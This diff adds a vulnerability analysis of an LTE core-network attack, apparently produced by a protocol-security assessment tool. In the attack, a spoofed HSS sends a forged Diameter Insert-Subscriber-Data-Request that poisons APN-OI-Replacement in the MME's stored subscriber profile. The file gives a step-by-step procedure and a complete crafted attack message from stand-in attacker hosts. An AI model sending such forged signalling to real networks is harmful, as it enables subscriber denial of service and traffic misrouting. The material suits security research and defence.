@@ -1,0 +1,76 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is the **MME** on **S6a**, and the attacker impersonates the **HSS** to send a forged `Insert-Subscriber-Data-Request (IDR)` directly to that MME. The MME accepts the request as authoritative subscriber-provisioning input and updates the targeted UE's cached subscription profile, including APN configuration data.
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the exposed MME, send crafted **IDR Requests**, and receive the corresponding Answers. The attacker knows the target subscriber identity (for example the IMSI in `User-Name`), but does **not** control legitimate HSS links, radio procedures, GTP/NAS signaling, or downstream PGW infrastructure beyond what the forged subscriber data itself can influence.
+
+### **Exploitability Analysis:**
+- `Subscription-Data.APN-Configuration-Profile.APN-Configuration.APN-OI-Replacement` is not mere metadata; it is an **authoritative 3GPP subscriber-profile leaf** inside the HSS-provided APN configuration that the MME stores for the UE. It is optional, vendor-specific (`Vendor-Id 10415`), string-like (`OctetString`) data, but when present it directly affects how the MME later derives or validates the **operator identifier portion** of a full APN for that specific `APN-Configuration` instance.
+- The field-specific causal chain is concrete: a forged IDR carrying a modified `APN-OI-Replacement` for a chosen `Context-Identifier` causes the MME to overwrite the cached APN configuration entry for that subscriber; on a later attach/PDN-connectivity event, the MME uses that stored value during APN construction/selection; the resulting full APN can differ from the legitimate one; that changed APN is then used in downstream EPC session establishment toward SGW/PGW selection and APN routing.
+- Because the changed behavior depends on the **value of this field itself**, the incremental impact is field-specific. A malicious but syntactically valid replacement can cause **wrong APN selection**, **unknown/unroutable APN use**, **default PDN establishment failure**, or routing into a different accepted APN namespace if such an alternate OI is valid in the operator environment. This is a real subscriber-state poisoning path even without any extra attacker control over radio or GTP links.
+- The impact is usually **deferred rather than immediate**: receiving the IDR does not by itself tear down bearers, but it corrupts cached provisioning that the MME later consumes during session establishment. That still satisfies field-specific exploitability because the later failure or misrouting occurs specifically because `APN-OI-Replacement` changed.
+- Limits remain important: if the attacker chooses an invalid OI, the likely result is denial of service for future PDN setup rather than useful redirection; if the chosen alternate OI is not actually provisioned downstream, session setup may simply fail. Even so, the field still supports a concrete field-driven attack path: persistent corruption of APN construction logic for the targeted subscriber until later legitimate HSS resynchronization, detach/context deletion, or a fresh profile download overwrites it.
+
+### **Attack Procedure:**
+- Craft a forged S6a `Insert-Subscriber-Data-Request` from the spoofed HSS identity to the target MME, including the target subscriber `User-Name`, standard request AVPs, and a `Subscription-Data` subtree containing `APN-Configuration-Profile`.
+- Inside one `APN-Configuration`, include at minimum a coherent `Context-Identifier`, `Service-Selection`, and the malicious `APN-OI-Replacement`; include `All-APN-Configurations-Included-Indicator` at profile level so the update is interpreted coherently.
+- Set `APN-OI-Replacement` to a syntactically valid but wrong operator identifier so the MME accepts and stores it for that APN entry.
+- The expected success condition is that the MME returns a successful IDA, and on the subscriber's next attach or PDN connectivity procedure the resulting APN is altered, causing session failure or different APN routing behavior.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true,
+    "vendor_specific": false
+  },
+  "avps": [
+    { "name": "Session-Id", "value": "attacker-hss.example;1234567890;1" },
+    { "name": "Auth-Session-State", "value": 1 },
+    { "name": "Origin-Host", "value": "hss.attacker.example" },
+    { "name": "Origin-Realm", "value": "attacker.example" },
+    { "name": "Destination-Host", "value": "mme01.epc.example.net" },
+    { "name": "Destination-Realm", "value": "epc.example.net" },
+    { "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    { "name": "User-Name", "value": "001010123456789" },
+    { "name": "IDR-Flags", "value": 0 },
+    { "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "Service-Selection": "internet",
+              "APN-OI-Replacement": "attacker.mnc01.mcc001.gprs",
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 9,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 15,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              },
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
